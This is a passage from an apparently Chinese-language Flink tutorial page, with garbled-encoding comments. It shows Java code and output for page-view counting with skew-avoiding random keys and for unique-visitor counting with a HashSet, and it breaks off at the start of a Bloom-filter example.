org.apache.flink.streaming.api.functions.windowing.WindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.TumblingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 3:11 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PageView</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// è®¾ç½®å¹¶è¡Œåº¦ä¸º4</span></span><br><span class="line">    env.setParallelism(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. ä»csvæ–‡ä»¶ä¸­è·å–æ•°æ®</span></span><br><span class="line">    URL resource = PageView.class.getResource(<span class="string">&quot;/UserBehavior.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(resource.getPath());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. è½¬æ¢æˆPOJO,åˆ†é…æ—¶é—´æˆ³å’Œwatermark</span></span><br><span class="line">    DataStream&lt;UserBehavior&gt; userBehaviorDataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> UserBehavior(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Integer(fields[<span class="number">2</span>]), fields[<span class="number">3</span>], <span class="keyword">new</span> Long(fields[<span class="number">4</span>]));</span><br><span class="line">    &#125;).assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">      <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;UserBehavior&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(UserBehavior element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. åˆ†ç»„å¼€çª—èšåˆï¼Œå¾—åˆ°æ¯ä¸ªçª—å£å†…å„ä¸ªå•†å“çš„countå€¼</span></span><br><span class="line">    DataStream&lt;Tuple2&lt;String, Long&gt;&gt; pvResultStream0 = userBehaviorDataStream</span><br><span class="line">      <span class="comment">// è¿‡æ»¤åªä¿ç•™pvè¡Œä¸º</span></span><br><span class="line">      .filter(userBehavior -&gt; <span class="string">&quot;pv&quot;</span>.equals(userBehavior.getBehavior()))</span><br><span class="line">      .map(<span class="keyword">new</span> MapFunction&lt;UserBehavior, Tuple2&lt;String, Long&gt;&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Tuple2&lt;String, Long&gt; <span class="title">map</span><span class="params">(UserBehavior value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(<span class="string">&quot;pv&quot;</span>, <span class="number">1L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="comment">// æŒ‰ç…§å•†å“IDåˆ†ç»„</span></span><br><span class="line">      .keyBy(item -&gt; item.f0)</span><br><span class="line">      <span class="comment">// 1å°æ—¶æ»šåŠ¨çª—å£</span></span><br><span class="line">      .window(TumblingEventTimeWindows.of(Time.hours(<span class="number">1</span>)))</span><br><span class="line">      .sum(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  å¹¶è¡Œä»»åŠ¡æ”¹è¿›ï¼Œè®¾è®¡éšæœºkeyï¼Œè§£å†³æ•°æ®å€¾æ–œé—®é¢˜</span></span><br><span class="line">    SingleOutputStreamOperator&lt;PageViewCount&gt; pvStream = userBehaviorDataStream.filter(data -&gt; <span class="string">&quot;pv&quot;</span>.equals(data.getBehavior()))</span><br><span class="line">      .map(<span class="keyword">new</span> MapFunction&lt;UserBehavior, Tuple2&lt;Integer, Long&gt;&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Tuple2&lt;Integer, Long&gt; <span class="title">map</span><span class="params">(UserBehavior value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">          Random random = <span class="keyword">new</span> Random();</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(random.nextInt(<span class="number">10</span>), <span class="number">1L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      .keyBy(data -&gt; data.f0)</span><br><span class="line">      .window(TumblingEventTimeWindows.of(Time.hours(<span class="number">1</span>)))</span><br><span class="line">      .aggregate(<span class="keyword">new</span> PvCountAgg(), <span class="keyword">new</span> PvCountResult());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°†å„åˆ†åŒºæ•°æ®æ±‡æ€»èµ·æ¥</span></span><br><span class="line">    DataStream&lt;PageViewCount&gt; pvResultStream = pvStream</span><br><span class="line">      .keyBy(PageViewCount::getWindowEnd)</span><br><span class="line">      .process(<span class="keyword">new</span> TotalPvCount());</span><br><span class="line">    <span class="comment">//                .sum(&quot;count&quot;);</span></span><br><span class="line"></span><br><span class="line">    pvResultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;pv count job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰é¢„èšåˆå‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PvCountAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">Tuple2</span>&lt;<span class="title">Integer</span>, <span class="title">Long</span>&gt;, <span class="title">Long</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">add</span><span class="params">(Tuple2&lt;Integer, Long&gt; value, Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getResult</span><span class="params">(Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">merge</span><span class="params">(Long a, Long b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰çª—å£</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PvCountResult</span> <span class="keyword">implements</span> <span class="title">WindowFunction</span>&lt;<span class="title">Long</span>, <span class="title">PageViewCount</span>, <span class="title">Integer</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(Integer integer, TimeWindow window, Iterable&lt;Long&gt; input, Collector&lt;PageViewCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      out.collect( <span class="keyword">new</span> PageViewCount(integer.toString(), window.getEnd(), input.iterator().next()) );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰å¤„ç†å‡½æ•°ï¼ŒæŠŠç›¸åŒçª—å£åˆ†ç»„ç»Ÿè®¡çš„countå€¼å åŠ </span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TotalPvCount</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>, <span class="title">PageViewCount</span>, <span class="title">PageViewCount</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰çŠ¶æ€ï¼Œä¿å­˜å½“å‰çš„æ€»countå€¼</span></span><br><span class="line">    ValueState&lt;Long&gt; totalCountState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      totalCountState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Long&gt;(<span class="string">&quot;total-count&quot;</span>, Long.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(PageViewCount value, Context ctx, Collector&lt;PageViewCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      Long totalCount = totalCountState.value();</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">null</span> == totalCount)&#123;</span><br><span class="line">        totalCount = <span class="number">0L</span>;</span><br><span class="line">        totalCountState.update(totalCount);</span><br><span class="line">      &#125;</span><br><span class="line">      totalCountState.update( totalCount + value.getCount() );</span><br><span class="line">      ctx.timerService().registerEventTimeTimer(value.getWindowEnd() + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;PageViewCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// å®šæ—¶å™¨è§¦å‘ï¼Œæ‰€æœ‰åˆ†ç»„countå€¼éƒ½åˆ°é½ï¼Œç›´æ¥è¾“å‡ºå½“å‰çš„æ€»countæ•°é‡</span></span><br><span class="line">      Long totalCount = totalCountState.value();</span><br><span class="line">      out.collect(<span class="keyword">new</span> PageViewCount(<span class="string">&quot;pv&quot;</span>, ctx.getCurrentKey(), totalCount));</span><br><span class="line">      <span class="comment">// æ¸…ç©ºçŠ¶æ€</span></span><br><span class="line">      totalCountState.clear();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">2&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;pv&#x27;</span>, windowEnd=1511661600000, count=41890&#125;</span></span><br><span class="line"><span class="meta">2&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;pv&#x27;</span>, windowEnd=1511679600000, count=50838&#125;</span></span><br><span class="line"><span class="meta">1&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;pv&#x27;</span>, windowEnd=1511676000000, count=48649&#125;</span></span><br><span class="line"><span class="meta">4&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;pv&#x27;</span>, windowEnd=1511668800000, count=47298&#125;</span></span><br><span class="line"><span class="meta">2&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;pv&#x27;</span>, windowEnd=1511686800000, count=52552&#125;</span></span><br><span class="line"><span class="meta">4&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;pv&#x27;</span>, windowEnd=1511672400000, count=44499&#125;</span></span><br><span class="line"><span class="meta">3&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;pv&#x27;</span>, windowEnd=1511665200000, count=48022&#125;</span></span><br><span class="line"><span class="meta">4&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;pv&#x27;</span>, windowEnd=1511683200000, count=52296&#125;</span></span><br><span class="line"><span class="meta">2&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;pv&#x27;</span>, windowEnd=1511690400000, count=48292&#125;</span></span><br><span class="line"><span class="meta">3&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;pv&#x27;</span>, windowEnd=1511694000000, count=13&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»£ç 3-UVç»Ÿè®¡-Setå»é‡"><a href="#ä»£ç 3-UVç»Ÿè®¡-Setå»é‡" class="headerlink" title="ä»£ç 3-UVç»Ÿè®¡-Setå»é‡"></a>ä»£ç 3-UVç»Ÿè®¡-Setå»é‡</h6><ul><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.PageViewCount;</span><br><span class="line"><span class="keyword">import</span> beans.UserBehavior;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.AllWindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 3:51 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UniqueVisitor</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// è®¾ç½®å¹¶è¡Œåº¦ä¸º1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. ä»csvæ–‡ä»¶ä¸­è·å–æ•°æ®</span></span><br><span class="line">    URL resource = UniqueVisitor.class.getResource(<span class="string">&quot;/UserBehavior.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(resource.getPath());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. è½¬æ¢æˆPOJO,åˆ†é…æ—¶é—´æˆ³å’Œwatermark</span></span><br><span class="line">    DataStream&lt;UserBehavior&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> UserBehavior(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Integer(fields[<span class="number">2</span>]), fields[<span class="number">3</span>], <span class="keyword">new</span> Long(fields[<span class="number">4</span>]));</span><br><span class="line">    &#125;).assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">      <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;UserBehavior&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(UserBehavior element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¼€çª—ç»Ÿè®¡uvå€¼</span></span><br><span class="line">    SingleOutputStreamOperator&lt;PageViewCount&gt; uvStream = dataStream.filter(data -&gt; <span class="string">&quot;pv&quot;</span>.equals(data.getBehavior()))</span><br><span class="line">      .timeWindowAll(Time.hours(<span class="number">1</span>))</span><br><span class="line">      .apply(<span class="keyword">new</span> UvCountResult());</span><br><span class="line"></span><br><span class="line">    uvStream.print();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;uv count job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰å…¨çª—å£å‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">UvCountResult</span> <span class="keyword">implements</span> <span class="title">AllWindowFunction</span>&lt;<span class="title">UserBehavior</span>, <span class="title">PageViewCount</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(TimeWindow window, Iterable&lt;UserBehavior&gt; values, Collector&lt;PageViewCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// å®šä¹‰ä¸€ä¸ªSetç»“æ„ï¼Œä¿å­˜çª—å£ä¸­çš„æ‰€æœ‰userIdï¼Œè‡ªåŠ¨å»é‡</span></span><br><span class="line">      HashSet&lt;Long&gt; uidSet = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">      <span class="keyword">for</span> (UserBehavior ub : values) &#123;</span><br><span class="line">        uidSet.add(ub.getUerId());</span><br><span class="line">      &#125;</span><br><span class="line">      out.collect(<span class="keyword">new</span> PageViewCount(<span class="string">&quot;uv&quot;</span>, window.getEnd(), (<span class="keyword">long</span>) uidSet.size()));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511661600000, count=28196&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511665200000, count=32160&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511668800000, count=32233&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511672400000, count=30615&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511676000000, count=32747&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511679600000, count=33898&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511683200000, count=34631&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511686800000, count=34746&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511690400000, count=32356&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511694000000, count=13&#125;</span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»£ç 4-UVç»Ÿè®¡-å¸ƒéš†è¿‡æ»¤å™¨"><a href="#ä»£ç 4-UVç»Ÿè®¡-å¸ƒéš†è¿‡æ»¤å™¨" class="headerlink" title="ä»£ç 4-UVç»Ÿè®¡-å¸ƒéš†è¿‡æ»¤å™¨"></a>ä»£ç 4-UVç»Ÿè®¡-å¸ƒéš†è¿‡æ»¤å™¨</h6><ul><li><p> pomä¾èµ–  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>redis.clients<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jedis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.PageViewCount;</span><br><span class="line"><span class="keyword">import</span> beans.UserBehavior;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> 